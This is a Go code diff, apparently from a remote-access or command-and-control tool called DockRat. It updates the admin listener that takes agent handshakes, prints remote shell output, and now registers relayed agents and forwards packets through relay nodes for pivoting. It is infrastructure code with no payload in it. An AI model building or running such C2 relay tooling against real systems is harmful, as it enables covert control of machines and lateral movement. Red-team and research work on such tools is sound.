@@ -11,11 +11,7 @@ import (
 	"github.com/Singert/DockRat/core/protocol"
 )
 
-type HandshakePayload struct {
-	Hostname string `json:"hostname"`
-	Username string `json:"username"`
-	OS       string `json:"os"`
-}
+// -------------------------- admin专用的监听函数 -------------------------
 
 func StartListener(addr string, registry *node.Registry) {
 	ln, err := net.Listen("tcp", addr)
@@ -59,7 +55,7 @@ func handleConnection(conn net.Conn, registry *node.Registry) {
 	}
 
 	if msg.Type == protocol.MsgHandshake {
-		var payload HandshakePayload
+		var payload protocol.HandshakePayload
 		if err := json.Unmarshal(msg.Payload, &payload); err != nil {
 			log.Println("[!] Failed to decode handshake payload:", err)
 			conn.Close()
@@ -113,10 +109,78 @@ func handleAgentMessages(n *node.Node, registry *node.Registry) {
 			log.Printf("[#] Node %d response:\n%s", n.ID, string(msg.Payload))
 		case protocol.MsgShell:
 			fmt.Print(string(msg.Payload))
+		case protocol.MsgRelayReady:
+			var payload protocol.RelayReadyPayload
+			if err := json.Unmarshal(msg.Payload, &payload); err != nil {
+				log.Printf("[-] RelayReady decode failed: %v", err)
+				return
+			}
+			// nodeInfo, ok := registry.Get(payload.SelfID)
+			// ip := "(unknown)"
+			// if ok {
+			// 	ip = nodeInfo.Addr
+			// }
+			log.Printf("[Relay Ready] Node %d (%s) is now acting as relay ", payload.SelfID, payload.ListenAddr)
+
+			// 可选：标记该 node 为 relay（拓扑用途）
+			// if relayNode, ok := registry.Get(payload.SelfID); ok {
+			// 	// 如果你有 isRelay 字段，可在此设置
+			// 	log.Printf("[*] Relay node %d confirmed ready", payload.SelfID)
+			// }
+		case protocol.MsgRelayRegister:
+			var payload protocol.RelayRegisterPayload
+			if err := json.Unmarshal(msg.Payload, &payload); err != nil {
+				log.Printf("[-] RelayRegister decode failed: %v", err)
+				return
+			}
+
+			newNode := payload.Node
+			newID := newNode.ID
+
+			// 检查是否冲突
+			if _, exists := registry.Get(newID); exists {
+				log.Printf("[-] Duplicate node ID %d rejected", newID)
+				resp := protocol.RelayAckPayload{Success: false, Message: "ID already exists"}
+				sendAck(n.Conn, protocol.MsgRelayError, resp)
+				return
+			}
+
+			// 注册
+			registry.AddWithID(&newNode)
+			registry.NodeGraph.SetParent(newID, payload.ParentID)
+			log.Printf("[+] Registered relayed node ID %d under parent %d", newID, payload.ParentID)
+
+			resp := protocol.RelayAckPayload{Success: true, Message: "Registered"}
+			sendAck(n.Conn, protocol.MsgRelayAck, resp)
+		case protocol.MsgRelayPacket:
+			var pkt protocol.RelayPacket
+			if err := json.Unmarshal(msg.Payload, &pkt); err != nil {
+				log.Printf("[-] RelayPacket decode failed: %v", err)
+				return
+			}
+			target, ok := registry.Get(pkt.DestID)
+			if !ok {
+				log.Printf("[-] Unknown target ID %d for relay", pkt.DestID)
+				return
+			}
+			_, err := target.Conn.Write(pkt.Data)
+			if err != nil {
+				log.Printf("[-] Relay forward to %d failed: %v", pkt.DestID, err)
+				registry.Remove(pkt.DestID)
+				registry.NodeGraph.RemoveNode(pkt.DestID)
+			}
+
 		default:
 			log.Printf("[-] Node %d sent unknown message type: %s", n.ID, msg.Type)
 		}
 	}
 }
-
-
+func sendAck(conn net.Conn, msgType protocol.MessageType, ack protocol.RelayAckPayload) {
+	data, _ := json.Marshal(ack)
+	msg := protocol.Message{
+		Type:    msgType,
+		Payload: data,
+	}
+	buf, _ := protocol.EncodeMessage(msg)
+	conn.Write(buf)
+}
